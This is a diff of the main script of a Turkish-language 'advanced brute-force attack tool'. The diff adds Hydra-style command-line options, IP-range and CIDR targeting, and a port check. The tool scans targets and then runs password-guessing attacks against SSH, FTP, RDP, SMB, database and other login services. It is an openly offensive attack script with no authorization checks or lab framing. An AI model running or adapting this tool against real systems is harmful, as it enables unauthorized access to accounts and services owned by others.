@@ -1,6 +1,8 @@
 import os
 import socket
+import sys
 from services.scanner import NmapTarayici
+from services.port_checker import PortChecker
 from services.ftp import FTPBruteForce
 from services.ssh import SSHBruteForce
 from services.http import HTTPBruteForce
@@ -23,7 +25,18 @@ def giris_ekrani():
     print("=" * 60)
     print("GELİŞMİŞ BRUTE-FORCE SALDIRI ARACI".center(60))
     print("=" * 60)
-    print(f"Versiyon: 2.0 | Nmap Entegrasyonlu | MongoDB Desteği\n")
+    print(f"Versiyon: 3.0 | Parametrik Giriş | Port Check | Console Output\n")
+    print("💡 İpucu: -h yazarak yardım alabilirsiniz!")
+    print("💡 Kullanım: python main.py [hedef] [parametreler]")
+    print("💡 Örnekler:")
+    print("   python main.py 192.168.1.1 -h  (tüm servisler)")
+    print("   python main.py 192.168.1.1 -s ssh -t 8  (SSH, 8 thread)")
+    print("   python main.py 192.168.1.1 -s ftp -L users.txt -P pass.txt  (özel wordlist)")
+    print("   python main.py 192.168.1.1 -s http -V -f  (HTTP, verbose, first found)")
+    print("   python main.py 192.168.1.1 -s ssh -l admin -p password123  (tek kullanıcı/şifre)")
+    print("   python main.py 192.168.1.1 -n  (nmap taraması)")
+    print("   python main.py 192.168.1.1  (port check)")
+    print("=" * 60)
 
 def gecerli_ip_girisi(ip):
     try:
@@ -32,53 +45,162 @@ def gecerli_ip_girisi(ip):
     except socket.error:
         return False
 
+def parametrik_giris_kontrol(giris):
+    """Parametrik girişleri kontrol eder ve işler"""
+    giris = giris.strip()
+    
+    # Yardım parametresi
+    if giris.lower() in ['-h', '--help', 'help', 'yardım']:
+        print("\n" + "="*60)
+        print("PARAMETRİK GİRİŞ YARDIMI".center(60))
+        print("="*60)
+        print("Kullanım örnekleri:")
+        print("  IP Adresi: 192.168.1.1")
+        print("  IP Aralığı: 192.168.1.1-10")
+        print("  CIDR Notasyonu: 192.168.1.0/24")
+        print("  Hostname: example.com")
+        print("\nParametrik Kullanım:")
+        print("  -h: Tüm servislere saldırı")
+        print("  -s [servis]: Belirli servis (örn: -s ssh)")
+        print("  -n: Nmap taraması")
+        print("\nHydra Parametreleri:")
+        print("  -L [dosya]: Kullanıcı listesi dosyası")
+        print("  -P [dosya]: Şifre listesi dosyası")
+        print("  -l [kullanıcı]: Tek kullanıcı")
+        print("  -p [şifre]: Tek şifre")
+        print("  -t [sayı]: Thread sayısı")
+        print("  -W [saniye]: Timeout")
+        print("  -s [port]: Port numarası")
+        print("  -V: Verbose mod")
+        print("  -d: Debug mod")
+        print("  -f: İlk bulunanı durdur")
+        print("  -R: Restore session")
+        print("  -o [dosya]: Çıktı dosyası")
+        print("  -b [dosya]: Log dosyası")
+        print("  -x: XML çıktı")
+        print("  -F [parametreler]: Form parametreleri")
+        print("  -C [dosya]: Özel parametre dosyası")
+        print("  -M [dosya]: Modül dosyası")
+        print("  -m [servis]: Servis adı")
+        print("  Yardım: -h, --help, help, yardım")
+        print("  Çıkış: exit, quit, çıkış")
+        print("="*60)
+        return None
+    
+    # Çıkış parametresi
+    if giris.lower() in ['exit', 'quit', 'çıkış', 'q']:
+        print("[!] Program sonlandırılıyor...")
+        exit(0)
+    
+    # IP aralığı kontrolü (örn: 192.168.1.1-10)
+    if '-' in giris and giris.count('.') == 3:
+        try:
+            base_ip, range_part = giris.rsplit('.', 1)
+            start, end = range_part.split('-')
+            base_ip = f"{base_ip}.{start}"
+            if gecerli_ip_girisi(base_ip):
+                return giris  # IP aralığı geçerli
+        except:
+            pass
+    
+    # CIDR notasyonu kontrolü (örn: 192.168.1.0/24)
+    if '/' in giris:
+        try:
+            ip_part, cidr = giris.split('/')
+            if gecerli_ip_girisi(ip_part) and 0 <= int(cidr) <= 32:
+                return giris  # CIDR geçerli
+        except:
+            pass
+    
+    # Tek IP kontrolü
+    if gecerli_ip_girisi(giris):
+        return giris
+    
+    # Hostname kontrolü (basit)
+    if '.' in giris and not giris.startswith('-'):
+        return giris  # Hostname olarak kabul et
+    
+    return None
+
 def hedef_ip_al():
     while True:
-        ip = input("Hedef IP adresini girin: ").strip()
-        if gecerli_ip_girisi(ip):
-            return ip
-        print("[!] Geçersiz IP formatı! Örnek: 192.168.1.1")
+        giris = input("Hedef IP/Hostname girin (yardım için -h): ").strip()
+        
+        # Parametrik kontrol
+        sonuc = parametrik_giris_kontrol(giris)
+        if sonuc is None:
+            continue  # Yardım gösterildi, tekrar sor
+        elif sonuc:
+            return sonuc
+        
+        print("[!] Geçersiz format! Örnekler:")
+        print("  - IP: 192.168.1.1")
+        print("  - Aralık: 192.168.1.1-10")
+        print("  - CIDR: 192.168.1.0/24")
+        print("  - Hostname: example.com")
+        print("  - Yardım: -h")
 
-def servis_secimi():
-    print("\nKullanılabilir Servisler:")
-    for i, (servis, port) in enumerate(Ayarlar.PORTLAR.items(), 1):
-        print(f"{i}. {servis.upper()} (Port {port})")
+def port_check_ve_saldiri(hedef_ip, raporlayici):
+    """Port check ile açık portları bulup saldırı yapar"""
+    print(f"\n[+] {hedef_ip} için port check başlatılıyor...")
     
-    secim = input("\nTüm servisler için [A], seçim için [S], Nmap taraması için [N] girin: ").upper()
+    port_checker = PortChecker(hedef_ip)
+    acik_portlar = port_checker.servis_portlarini_tara()
+    acik_servisler = port_checker.acik_servisleri_getir()
     
-    if secim == 'N':
-        return 'NMAP'
-    elif secim == 'A':
-        return None  # Tüm servisler
-    elif secim == 'S':
-        try:
-            num = int(input("Servis numarası girin: "))
-            servis = list(Ayarlar.PORTLAR.keys())[num-1]
-            return [servis]
-        except (ValueError, IndexError):
-            print("[!] Geçersiz seçim, tüm servisler kullanılacak")
-            return None
-    else:
-        print("[!] Geçersiz seçim, tüm servisler kullanılacak")
-        return None
+    if not acik_servisler:
+        print("[-] Açık servis bulunamadı!")
+        return
+    
+    print(f"\n[+] Bulunan açık servisler:")
+    for servis, port in acik_servisler.items():
+        print(f"  - {servis.upper()} (Port {port})")
+    
+    # Servis sınıfları eşleme
+    servis_esleme = {
+        'ftp': FTPBruteForce,
+        'ssh': SSHBruteForce,
+        'http': HTTPBruteForce,
+        'https': HTTPSBruteForce,
+        'mysql': MySQLBruteForce,
+        'postgresql': PostgreSQLBruteForce,
+        'mongodb': MongoDBBruteForce,
+        'smtp': SMTPBruteForce,
+        'pop3': POP3BruteForce,
+        'imap': IMAPBruteForce,
+        'rdp': RDPBruteForce,
+        'smb': SMBBruteForce,
+        'telnet': TelnetBruteForce,
+        'vnc': VNCBruteForce,
+        'mssql': MSSQLBruteForce
+    }
+    
+    print(f"\n[+] Brute force saldırıları başlatılıyor...")
+    for servis_adi, port in acik_servisler.items():
+        if servis_adi in servis_esleme:
+            try:
+                saldiri = servis_esleme[servis_adi](hedef_ip, port)
+                saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
+            except Exception as e:
+                print(f"[!] {servis_adi.upper()} hatası: {str(e)}")
+                continue
 
 def nmap_tarama_ve_saldiri(hedef_ip, raporlayici):
+    """Nmap ile detaylı tarama ve saldırı"""
     try:
-        print("\n[+] Nmap tarama ayarları:")
-        print(f" - Port aralığı (varsayılan: {Ayarlar.NMAP_PORT_ARALIGI})")
-        print(f" - Tarama parametreleri: {Ayarlar.NMAP_ARGUMANLARI}")
+        print(f"\n[+] {hedef_ip} için Nmap taraması başlatılıyor...")
         
-        port_araligi = input("Port aralığı girin (örn: 1-1000): ").strip() or Ayarlar.NMAP_PORT_ARALIGI
         tarayici = NmapTarayici(hedef_ip)
-        acik_servisler = tarayici.detayli_tarama(port_araligi)
+        acik_servisler = tarayici.detayli_tarama()
         
         if not acik_servisler:
             print("[-] Açık port bulunamadı")
             return
         
-        print("\n[+] Bulunan Servisler:")
+        print(f"\n[+] Bulunan Servisler:")
         for servis in acik_servisler:
-            print(f" - Port {servis['port']}/{servis['protokol']}: {servis['servis']} ({servis['versiyon']})")
+            host = servis.get('host', hedef_ip)
+            print(f"  - {host}:{servis['port']}/{servis['protokol']}: {servis['servis']} ({servis['versiyon']})")
         
         servis_esleme = {
             'ftp': FTPBruteForce,
@@ -98,47 +220,247 @@ def nmap_tarama_ve_saldiri(hedef_ip, raporlayici):
             'mssql': MSSQLBruteForce
         }
         
+        print(f"\n[+] Brute force saldırıları başlatılıyor...")
         for servis in acik_servisler:
             servis_adi = servis['servis']
+            host = servis.get('host', hedef_ip)
             if servis_adi in servis_esleme:
-                print(f"\n[+] {servis_adi.upper()} servisi taranıyor ({hedef_ip}:{servis['port']})...")
                 try:
-                    saldiri = servis_esleme[servis_adi](hedef_ip, servis['port'])
-                    sonuc = saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
-                    if sonuc:
-                        print(f"[+] {servis_adi.upper()} için başarılı giriş bulundu!")
-                    else:
-                        print(f"[-] {servis_adi.upper()} için başarılı giriş bulunamadı.")
+                    saldiri = servis_esleme[servis_adi](host, servis['port'])
+                    saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
                 except Exception as e:
-                    print(f"[!] Hata: {str(e)}")
+                    print(f"[!] {servis_adi.upper()} hatası: {str(e)}")
                     continue
     except Exception as e:
         print(f"[!] Nmap tarama hatası: {str(e)}")
         raporlayici.rapor_ekle("NMAP", hedef_ip, "N/A", "HATA", str(e))
 
-def manuel_saldiri(hedef_ip, secilen_servisler, raporlayici):
-    servisler = []
+def tum_servislere_saldiri(hedef_ip, raporlayici):
+    """Tüm desteklenen servislere saldırı"""
+    print(f"\n[+] {hedef_ip} için tüm servislere saldırı başlatılıyor...")
+    
+    servis_esleme = {
+        'ftp': FTPBruteForce,
+        'ssh': SSHBruteForce,
+        'http': HTTPBruteForce,
+        'https': HTTPSBruteForce,
+        'mysql': MySQLBruteForce,
+        'postgresql': PostgreSQLBruteForce,
+        'mongodb': MongoDBBruteForce,
+        'smtp': SMTPBruteForce,
+        'pop3': POP3BruteForce,
+        'imap': IMAPBruteForce,
+        'rdp': RDPBruteForce,
+        'smb': SMBBruteForce,
+        'telnet': TelnetBruteForce,
+        'vnc': VNCBruteForce,
+        'mssql': MSSQLBruteForce
+    }
     
     for servis_adi, port in Ayarlar.PORTLAR.items():
-        if secilen_servisler is None or servis_adi in secilen_servisler:
+        if servis_adi in servis_esleme:
             try:
-                servis_sinifi = globals()[f"{servis_adi.upper()}BruteForce"]
-                servisler.append(servis_sinifi(hedef_ip, port))
-            except KeyError:
-                print(f"[!] {servis_adi} servis modülü bulunamadı")
+                print(f"\n[+] {servis_adi.upper()} servisi deneniyor...")
+                saldiri = servis_esleme[servis_adi](hedef_ip, port)
+                saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
+            except Exception as e:
+                print(f"[!] {servis_adi.upper()} hatası: {str(e)}")
+                continue
+
+def belirli_servise_saldiri(hedef_ip, servis_adi, raporlayici):
+    """Belirli bir servise saldırı"""
+    if servis_adi not in Ayarlar.PORTLAR:
+        print(f"[!] {servis_adi} servisi desteklenmiyor!")
+        return
+    
+    port = Ayarlar.PORTLAR[servis_adi]
+    servis_esleme = {
+        'ftp': FTPBruteForce,
+        'ssh': SSHBruteForce,
+        'http': HTTPBruteForce,
+        'https': HTTPSBruteForce,
+        'mysql': MySQLBruteForce,
+        'postgresql': PostgreSQLBruteForce,
+        'mongodb': MongoDBBruteForce,
+        'smtp': SMTPBruteForce,
+        'pop3': POP3BruteForce,
+        'imap': IMAPBruteForce,
+        'rdp': RDPBruteForce,
+        'smb': SMBBruteForce,
+        'telnet': TelnetBruteForce,
+        'vnc': VNCBruteForce,
+        'mssql': MSSQLBruteForce
+    }
+    
+    if servis_adi in servis_esleme:
+        try:
+            saldiri = servis_esleme[servis_adi](hedef_ip, port)
+            saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
+        except Exception as e:
+            print(f"[!] {servis_adi.upper()} hatası: {str(e)}")
+
+def parametrik_komut_isle(hedef_ip, parametreler):
+    """Parametrik komut satırı girişini işler"""
+    print(f"[+] Hedef: {hedef_ip}")
+    print(f"[+] Parametreler: {' '.join(parametreler)}")
+    
+    # Parametreleri analiz et
+    servisler = []
+    hydra_parametreleri = {}
+    
+    i = 0
+    while i < len(parametreler):
+        param = parametreler[i]
+        
+        # Servis seçimi (-s)
+        if param == "-s" and i + 1 < len(parametreler):
+            servis = parametreler[i + 1].lower()
+            if servis in Ayarlar.PORTLAR:
+                servisler.append(servis)
+            else:
+                print(f"[!] Bilinmeyen servis: {servis}")
+            i += 2
+            
+        # Tüm servisler (-h)
+        elif param == "-h":
+            servisler = list(Ayarlar.PORTLAR.keys())
+            i += 1
+            
+        # Nmap taraması (-n)
+        elif param == "-n":
+            print(f"[+] Nmap taraması başlatılıyor...")
+            raporlayici = Raporlayici()
+            nmap_tarama_ve_saldiri(hedef_ip, raporlayici)
+            return
+            
+        # Hydra parametreleri
+        elif param in ["-L", "-P", "-l", "-p", "-t", "-W", "-s", "-o", "-b", "-R", "-F", "-C", "-M", "-m"]:
+            if i + 1 < len(parametreler):
+                hydra_parametreleri[param] = parametreler[i + 1]
+                print(f"[+] Hydra parametresi: {param} {parametreler[i + 1]}")
+                i += 2
+            else:
+                print(f"[!] {param} parametresi için değer eksik")
+                i += 1
+                
+        # Boolean parametreler
+        elif param in ["-V", "-d", "-f", "-R", "-x"]:
+            hydra_parametreleri[param] = True
+            print(f"[+] Hydra parametresi: {param}")
+            i += 1
+            
+        # Özel parametreler (-- ile başlayan)
+        elif param.startswith("--"):
+            if i + 1 < len(parametreler) and not parametreler[i + 1].startswith("-"):
+                hydra_parametreleri[param] = parametreler[i + 1]
+                print(f"[+] Özel parametre: {param} {parametreler[i + 1]}")
+                i += 2
+            else:
+                hydra_parametreleri[param] = True
+                print(f"[+] Özel parametre: {param}")
+                i += 1
+                
+        # Bilinmeyen parametreler
+        else:
+            print(f"[!] Bilinmeyen parametre: {param}")
+            i += 1
+    
+    # Eğer servis belirtilmemişse port check yap
+    if not servisler:
+        print(f"[+] Port check ile servis tespiti yapılıyor...")
+        port_checker = PortChecker(hedef_ip)
+        acik_portlar = port_checker.servis_portlarini_tara()
+        acik_servisler = port_checker.acik_servisleri_getir()
+        servisler = list(acik_servisler.keys())
+        
+        if not servisler:
+            print("[-] Açık servis bulunamadı!")
+            return
+    
+    print(f"[+] Saldırılacak servisler: {', '.join(servisler).upper()}")
+    
+    # Servis sınıfları eşleme
+    servis_esleme = {
+        'ftp': FTPBruteForce,
+        'ssh': SSHBruteForce,
+        'http': HTTPBruteForce,
+        'https': HTTPSBruteForce,
+        'mysql': MySQLBruteForce,
+        'postgresql': PostgreSQLBruteForce,
+        'mongodb': MongoDBBruteForce,
+        'smtp': SMTPBruteForce,
+        'pop3': POP3BruteForce,
+        'imap': IMAPBruteForce,
+        'rdp': RDPBruteForce,
+        'smb': SMBBruteForce,
+        'telnet': TelnetBruteForce,
+        'vnc': VNCBruteForce,
+        'mssql': MSSQLBruteForce
+    }
+    
+    # Varsayılan değerler
+    kullanici_listesi = hydra_parametreleri.get('-L', Ayarlar.KULLANICI_ADI_LISTESI)
+    sifre_listesi = hydra_parametreleri.get('-P', Ayarlar.PAROLA_LISTESI)
+    
+    # Saldırıları başlat
+    raporlayici = Raporlayici()
+    for servis_adi in servisler:
+        if servis_adi in servis_esleme:
+            try:
+                port = Ayarlar.PORTLAR[servis_adi]
+                saldiri = servis_esleme[servis_adi](hedef_ip, port)
+                
+                # Hydra parametrelerini uygula
+                for param, value in hydra_parametreleri.items():
+                    if param == '-t':
+                        saldiri.thread_sayisi = int(value)
+                    elif param == '-W':
+                        saldiri.timeout = int(value)
+                    elif param == '-L':
+                        saldiri.kullanici_listesi = value
+                    elif param == '-P':
+                        saldiri.sifre_listesi = value
+                    elif param == '-l':
+                        saldiri.tek_kullanici = value
+                    elif param == '-p':
+                        saldiri.tek_sifre = value
+                    elif param == '-s':
+                        saldiri.port = int(value)
+                    elif param == '-V':
+                        saldiri.verbose = True
+                    elif param == '-d':
+                        saldiri.debug = True
+                    elif param == '-f':
+                        saldiri.first_found = True
+                    elif param == '-R':
+                        saldiri.restore = True
+                    elif param == '-o':
+                        saldiri.output_file = value
+                    elif param == '-b':
+                        saldiri.log_file = value
+                    elif param == '-x':
+                        saldiri.xml_output = True
+                    elif param == '-F':
+                        saldiri.form_params = value
+                    elif param == '-C':
+                        saldiri.custom_params = value
+                    elif param == '-M':
+                        saldiri.module_path = value
+                    elif param == '-m':
+                        saldiri.service_name = value
+                
+                saldiri.saldir(kullanici_listesi, sifre_listesi)
+            except Exception as e:
+                print(f"[!] {servis_adi.upper()} hatası: {str(e)}")
                 continue
     
-    for servis in servisler:
-        print(f"\n[+] {servis.servis_adi} servisi taranıyor ({hedef_ip}:{servis.hedef_port})...")
-        try:
-            sonuc = servis.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
-            if sonuc:
-                print(f"[+] {servis.servis_adi} için başarılı giriş bulundu!")
-            else:
-                print(f"[-] {servis.servis_adi} için başarılı giriş bulunamadı.")
-        except Exception as e:
-            print(f"[!] Hata: {str(e)}")
-            continue
+    # Rapor
+    print(f"\n" + "="*60)
+    print("SONUÇ RAPORU".center(60))
+    print("="*60)
+    raporlayici.rapor_yazdir()
+    raporlayici.raporu_dosyaya_kaydet(Ayarlar.RAPOR_DOSYASI)
+    print(f"\n[+] Rapor kaydedildi: {Ayarlar.RAPOR_DOSYASI}")
 
 def main():
     # Dizinleri oluştur
@@ -146,20 +468,60 @@ def main():
         os.makedirs(dir, exist_ok=True)
     
     giris_ekrani()
-    hedef_ip = hedef_ip_al()
-    secim = servis_secimi()
     
-    raporlayici = Raporlayici()
-    
-    if secim == 'NMAP':
-        nmap_tarama_ve_saldiri(hedef_ip, raporlayici)
+    # Komut satırı parametreleri kontrolü
+    if len(sys.argv) > 1:
+        hedef_ip = sys.argv[1]
+        
+        # Eğer sadece IP verilmişse parametrik komut işle
+        if len(sys.argv) > 2:
+            parametreler = sys.argv[2:]
+            parametrik_komut_isle(hedef_ip, parametreler)
+        else:
+            # Sadece IP verilmişse port check yap
+            print(f"[+] Hedef: {hedef_ip}")
+            print(f"[+] Port check ile saldırı başlatılıyor...")
+            raporlayici = Raporlayici()
+            port_check_ve_saldiri(hedef_ip, raporlayici)
+            
+            # Rapor
+            print(f"\n" + "="*60)
+            print("SONUÇ RAPORU".center(60))
+            print("="*60)
+            raporlayici.rapor_yazdir()
+            raporlayici.raporu_dosyaya_kaydet(Ayarlar.RAPOR_DOSYASI)
+            print(f"\n[+] Rapor kaydedildi: {Ayarlar.RAPOR_DOSYASI}")
     else:
-        manuel_saldiri(hedef_ip, secim, raporlayici)
-    
-    # Rapor
-    raporlayici.rapor_yazdir()
-    raporlayici.raporu_dosyaya_kaydet(Ayarlar.RAPOR_DOSYASI)
-    print(f"\n[+] Rapor kaydedildi: {Ayarlar.RAPOR_DOSYASI}")
+        # Etkileşimli mod
+        hedef_ip = hedef_ip_al()
+        print(f"\n[+] Hedef: {hedef_ip}")
+        print("\nMod seçimi:")
+        print("1. Port Check ile saldırı (varsayılan)")
+        print("2. Nmap ile detaylı tarama")
+        print("3. Tüm servislere saldırı")
+        print("4. Belirli servis seçimi")
+        
+        secim = input("\nMod seçin (1-4, varsayılan: 1): ").strip() or "1"
+        
+        raporlayici = Raporlayici()
+        
+        if secim == "2":
+            nmap_tarama_ve_saldiri(hedef_ip, raporlayici)
+        elif secim == "3":
+            tum_servislere_saldiri(hedef_ip, raporlayici)
+        elif secim == "4":
+            servis_adi = input("Servis adı girin (örn: ssh): ").strip().lower()
+            belirli_servise_saldiri(hedef_ip, servis_adi, raporlayici)
+        else:
+            port_check_ve_saldiri(hedef_ip, raporlayici)
+        
+        # Rapor
+        print(f"\n" + "="*60)
+        print("SONUÇ RAPORU".center(60))
+        print("="*60)
+        raporlayici.rapor_yazdir()
+        raporlayici.raporu_dosyaya_kaydet(Ayarlar.RAPOR_DOSYASI)
+        print(f"\n[+] Rapor kaydedildi: {Ayarlar.RAPOR_DOSYASI}")
 
 if __name__ == "__main__":
     main()
